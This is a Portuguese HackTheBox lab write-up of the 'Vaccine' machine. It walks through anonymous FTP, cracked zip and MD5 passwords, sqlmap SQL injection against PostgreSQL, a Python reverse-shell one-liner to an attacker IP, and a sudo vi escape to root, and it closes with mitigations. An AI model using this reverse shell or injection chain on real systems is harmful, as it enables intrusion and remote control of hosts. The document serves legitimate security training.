# Vaccine — HackTheBox

**Plataforma:** HackTheBox
**Máquina:** Vaccine
**Dificuldade:** Easy
**SO:** Linux
**Data:** 24/07/2026
**Tags:** #enum #foothold #privesc #ftp #sqlinjection
**Status:** Retired ✅

## TL;DR

O acesso inicial começa por um servidor **FTP com login anônimo habilitado**, de onde é possível baixar um `backup.zip` protegido por senha. A senha do zip é quebrada offline com **John the Ripper**, revelando o código-fonte do painel de login (`index.php`), que contém um hash **MD5 hardcoded** da senha do usuário `admin`. Esse hash é quebrado em segundos com o CrackStation, permitindo login legítimo no painel administrativo.

Dentro do painel, o parâmetro `search` do `dashboard.php` está vulnerável a **SQL Injection** (backend PostgreSQL). O `sqlmap` identifica múltiplos tipos de injeção (boolean-based, error-based, stacked queries, time-based) e, aproveitando a capacidade de `stacked queries` do PostgreSQL, obtém um `os-shell` via `COPY ... FROM PROGRAM ...`. A partir desse shell semi-interativo é lançado um reverse shell completo, capturando a primeira flag (`user.txt`).

Para a escalada de privilégios, uma senha em texto claro é encontrada dentro de `/var/www/html/dashboard.php`, permitindo login SSH como o usuário `postgres`. O `sudo -l` revela permissão para rodar `vi` como root sobre um arquivo de configuração do PostgreSQL — um clássico caso de escape de editor documentado no GTFOBins, que resulta em uma shell root interativa e na segunda flag (`root.txt`).

**Cadeia de ataque:** FTP anônimo → backup.zip (senha quebrada via John) → hash MD5 hardcoded em index.php (quebrado via CrackStation) → login admin → SQL Injection (PostgreSQL) → os-shell via sqlmap → reverse shell → credencial em texto claro em dashboard.php → SSH como postgres → sudo em `vi` (GTFOBins) → root

---

## 1. Recon

### 1.1 Enumeração com Nmap

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 08:06 -0300
Nmap scan report for 10.129.95.174
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.203
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
```

Três portas abertas: **FTP (21)** com `vsftpd 3.0.3` e login anônimo habilitado (já expondo um arquivo `backup.zip` no banner do próprio Nmap), **SSH (22)** e **HTTP (80)** com um painel de login ("MegaCorp Login") em Apache 2.4.41. O FTP anônimo já se destaca como primeiro vetor a explorar.

### 1.2 Enumeração de diretórios com Gobuster

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.174
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
index.php            (Status: 200) [Size: 2312]
server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
```

Apenas `index.php` como página relevante — a aplicação web é pequena, o que reforça que o caminho de ataque inicial passa pelo FTP.

---

## 2. Foothold (acesso inicial)

### 2.1 FTP anônimo → backup.zip

```
┌──(gabriel㉿gabriel)-[~]
└─$ ftp anonymous@10.129.95.174
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10992|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> 
```

O login anônimo é aceito e disponibiliza o arquivo `backup.zip`, que está protegido por senha. Convertendo o zip para um hash crackeável (`zip2john`) e rodando o **John the Ripper** contra ele, a senha é quebrada:

#### 741852963

Extraindo o zip com essa senha, obtemos dois arquivos:

- `index.php`
- `style.css`

### 2.2 Hash MD5 hardcoded no código-fonte

O arquivo `index.php` traz, logo no início, a lógica de autenticação do painel — e ela expõe um hash MD5 fixo comparado à senha enviada pelo usuário:

```php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
```

> Esse hash (`2cb42f8734ea607eefed3b70af13bbd3`) é uma evidência técnica do próprio código vulnerável analisado — não é uma flag do desafio, por isso é mantido em texto integral.

Jogando esse MD5 no [Crack Station](https://crackstation.net/), a senha em texto claro do usuário **admin** é revelada:

#### qwerty789

### 2.3 Login administrativo e captura de sessão

Com essas credenciais é possível acessar o painel de administração do site. Ao autenticar, capturamos também o cookie de sessão:

#### PHPSESSID=kb39m3fva7ng0eaagkacsapgej

### 2.4 SQL Injection no parâmetro `search` → os-shell via sqlmap

Com a sessão autenticada em mãos, o `sqlmap` é usado para investigar o parâmetro `search` de `dashboard.php`, buscando expandir o acesso até uma shell interativa na máquina:

```
sqlmap -u "http://10.129.95.174/dashboard.php?search=test" --cookie="PHPSESSID=kb39m3fva7ng0eaagkacsapgej" -p search --os-shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.6#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:29:05 /2026-08-05/

[08:29:05] [INFO] resuming back-end DBMS 'postgresql' 
[08:29:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: id=1&search=teste' AND (SELECT (CASE WHEN (6193=6193) THEN NULL ELSE CAST((CHR(85)||CHR(82)||CHR(84)||CHR(72)) AS NUMERIC) END)) IS NULL-- zrij

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: id=1&search=teste' AND 1340=CAST((CHR(113)||CHR(122)||CHR(112)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (1340=1340) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC)-- AJrn

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: id=1&search=teste';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: id=1&search=teste' AND 2915=(SELECT 2915 FROM PG_SLEEP(5))-- eqTX
---
[08:29:06] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[08:29:06] [INFO] fingerprinting the back-end DBMS operating system
[08:29:06] [INFO] the back-end DBMS operating system is Linux
[08:29:07] [INFO] testing if current user is DBA
[08:29:07] [WARNING] reflective value(s) found and filtering out
[08:29:07] [INFO] retrieved: '1'
[08:29:07] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[08:29:07] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

O parâmetro é vulnerável a múltiplas técnicas de injeção sobre PostgreSQL (boolean-based, error-based, stacked queries e time-based blind). Como o usuário do banco tem privilégios de DBA, o `sqlmap` consegue executar comandos de sistema operacional via `COPY ... FROM PROGRAM ...`, abrindo um `os-shell`.

### 2.5 De os-shell para reverse shell completo

O `os-shell` do sqlmap ainda opera dentro de uma instância SQL, então o próximo passo é usá-lo para lançar um reverse shell de verdade:

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.15.203",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
┌──(gabriel㉿gabriel)-[~]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.15.203] from (UNKNOWN) [10.129.95.174] 34230
$ whoami
$ ls
base          pg_multixact  pg_stat      PG_VERSION            postmaster.pid
global        pg_notify     pg_stat_tmp  pg_wal
pg_commit_ts  pg_replslot   pg_subtrans  pg_xact
pg_dynshmem   pg_serial     pg_tblspc    postgresql.auto.conf
pg_logical    pg_snapshots  pg_twophase  postmaster.opts
$ cd ..
$ ls
main
$ cd ..
$ ls
11  user.txt
$ cat user.txt  
ec9b13ca...5bf7
$ 
```

Reverse shell recebida rodando com o contexto de execução do PostgreSQL, o que já é suficiente para ler a primeira flag.

---

## 3. Escalada de privilégios

### 3.1 Credencial em texto claro no código-fonte da aplicação

Analisando os arquivos da aplicação web, a senha do usuário `postgres` do sistema é encontrada em texto claro dentro de `/var/www/html/dashboard.php`:

#### P@s5w0rd!

### 3.2 Acesso SSH e `sudo -l`

Com essa credencial é possível acessar via SSH como `postgres`. Verificando as permissões de sudo:

```
postgres@vaccine:/var/www/html$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:/var/www/html$ 
```

O usuário `postgres` pode rodar `vi` como root sobre um arquivo de configuração específico do PostgreSQL — um caso documentado no [GTFOBins (vi)](https://gtfobins.org/gtfobins/vi/), que permite escapar do editor para uma shell.

### 3.3 Escape do `vi` → shell root

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dentro do `vi` aberto como root, o comando `:sh` escapa para uma shell interativa já com privilégios de root:

```
root@vaccine:/var/lib/postgresql# whoami
root
root@vaccine:/var/lib/postgresql# sudo visudo
visudo: /etc/sudoers.tmp unchanged
root@vaccine:/var/lib/postgresql# cat /root/root.txt
dd6e058e...5849
root@vaccine:/var/lib/postgresql# 
```

E assim obtemos a última flag, como root.

---

## 4. Causa raiz e mitigação

| # | Vulnerabilidade | Causa raiz | Mitigação |
|---|---|---|---|
| 1 | FTP anônimo com arquivo sensível exposto | `vsftpd` configurado para aceitar login anônimo e servir um backup contendo código-fonte da aplicação | Desabilitar login anônimo em serviços FTP de produção; nunca armazenar backups de código/credenciais em locais publicamente acessíveis |
| 2 | Senha de backup fraca | `backup.zip` protegido por uma senha numérica simples, quebrável em segundos com John the Ripper | Usar senhas fortes e aleatórias para arquivos protegidos, ou preferencialmente criptografia com chave gerenciada em vez de zip com senha |
| 3 | Credencial hardcoded (hash MD5) no código-fonte | `index.php` compara a senha enviada diretamente contra um hash MD5 fixo embutido no código | Nunca hardcodar credenciais/hashes no código-fonte; usar autenticação contra um armazenamento de usuários com hashing forte (bcrypt/argon2) e salt |
| 4 | SQL Injection no parâmetro `search` | Entrada do usuário concatenada diretamente na query SQL sem parametrização | Usar prepared statements / queries parametrizadas em todo acesso a banco de dados; aplicar validação e allowlist de entrada |
| 5 | Usuário de banco com privilégios excessivos (DBA) | A conta usada pela aplicação tem permissões suficientes para executar comandos de SO via `COPY ... FROM PROGRAM ...` | Aplicar princípio do menor privilégio: a conta de aplicação não deveria ter permissões de superusuário/DBA nem capacidade de executar programas externos |
| 6 | Credencial de sistema em texto claro no código da aplicação | Senha do usuário `postgres` do sistema operacional armazenada em texto claro em `dashboard.php` | Usar variáveis de ambiente ou gerenciador de segredos; nunca reaproveitar/armazenar credenciais de sistema no código da aplicação |
| 7 | Regra de `sudo` perigosa (GTFOBins) | `postgres` autorizado via `sudoers` a rodar `vi` como root, editor com capacidade nativa de escape para shell | Evitar liberar editores de texto interativos via sudo; se necessário, usar `sudoedit`/`rvim` restrito, ou scripts de wrapper sem acesso a `:sh`/`!` |

---

## 5. Lições aprendidas

- Serviços legados como FTP com login anônimo continuam sendo, na prática, uma das formas mais comuns de vazamento inicial de dados sensíveis — sempre vale a pena checar.
- Backups protegidos por senha fraca são triviais de quebrar offline; a presença de um arquivo `.zip` em um serviço exposto deve sempre motivar uma tentativa de crackeamento antes de descartar o vetor.
- Hashes e credenciais hardcoded no código-fonte são um alvo de altíssimo valor assim que qualquer acesso de leitura a arquivos é obtido — grep por padrões de hash/senha deve ser um passo automático de pós-exploração.
- Contas de banco de dados usadas por aplicações web não deveriam ter privilégios de DBA: foi exatamente esse excesso de permissão que permitiu o `sqlmap` pular de uma SQL Injection simples para execução de comandos no sistema operacional.
- Regras de `sudo` que liberam editores de texto (vi, vim, nano, etc.) quase sempre são exploráveis via GTFOBins — revisar `sudo -l` deve ser um dos primeiros passos em qualquer fase de escalada de privilégios local.
